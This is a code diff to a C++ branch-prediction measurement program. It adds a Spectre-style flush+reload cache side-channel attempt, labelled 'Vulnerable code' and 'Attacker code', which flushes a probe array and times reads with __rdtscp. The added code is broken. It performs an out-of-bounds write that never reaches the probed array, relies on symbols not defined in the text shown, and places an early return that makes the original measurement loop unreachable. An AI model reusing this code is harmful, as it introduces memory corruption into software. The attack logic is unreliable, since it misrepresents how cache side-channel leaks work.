@@ -13,21 +13,21 @@
 
 
 std::ofstream output("output.csv");
-uint64_t array_size = 10;
-uint64_t array[10] = {
+int array_size = 10;
+int array[10] = {
     0, 1, 2, 3, 4, 5, 6, 7, 8, 9
 };
 
-void victim_function(uint64_t x) {
+void victim_function(int x) {
     if (x < array_size) {
-        uint64_t temp = array[x];
+        int temp = array[x];
     }
 }
 
-void observe_victim(uint64_t x) {
+void observe_victim(int x) {
     struct perf_event_attr pe[NUM_EVENTS];
     int fd[NUM_EVENTS];
-    uint64_t count[NUM_EVENTS];
+    int count[NUM_EVENTS];
 
     memset(&pe, 0, sizeof(struct perf_event_attr) * NUM_EVENTS);
 
@@ -72,16 +72,43 @@ void observe_victim(uint64_t x) {
            << (double)count[1] / count[0] << std::endl;
 }
 
-void flush_cache() {
-    const int size = 20*1024*1024;
-     char *c = (char *)malloc(size);
-     for (int i = 0; i < 10; i++)
-       for (int j = 0; j < size; j++)
-         c[j] = i*j;
+// Vulnerable code
+unsigned char secret_value = 'A';
+unsigned char array2[10] = {0};
+
+void leak_secret_value() {
+    int index = (secret_value * 256); // Out-of-bounds memory access
+    array2[index] = 1;
+}
+
+// Attacker code
+unsigned char probe_array[256 * 4096] = {0}; // Huge array to bypass cache
+
+void victim_function2() {
+    leak_secret_value();
 }
 
 int main()
 {
+    // Flush array from cache
+    for (int i = 0; i < 256; i++) {
+        _mm_clflush(&probe_array[i * 4096]);
+    }
+
+    // Call victim function
+    victim_function2();
+
+    // Check for secret value
+    for (int i = 0; i < 256; i++) {
+        unsigned long long time1 = __rdtscp(&junk);
+        unsigned char val = probe_array[i * 4096];
+        unsigned long long time2 = __rdtscp(&junk) - time1;
+        if (time2 < CACHE_HIT_THRESHOLD) {
+            printf("Array[%d] = %d\n", i, val);
+        }
+    }
+    return 0;
+
     output << "Index;Branch instructions;Branch misses;Branch miss rate" << std::endl;
     //output << "Index;Branch instructions;Branch misses;Branch miss rate;Cache references;Cache misses;Cache miss rate" << std::endl;
     for (int i = 0; i < 1000000; i++) {
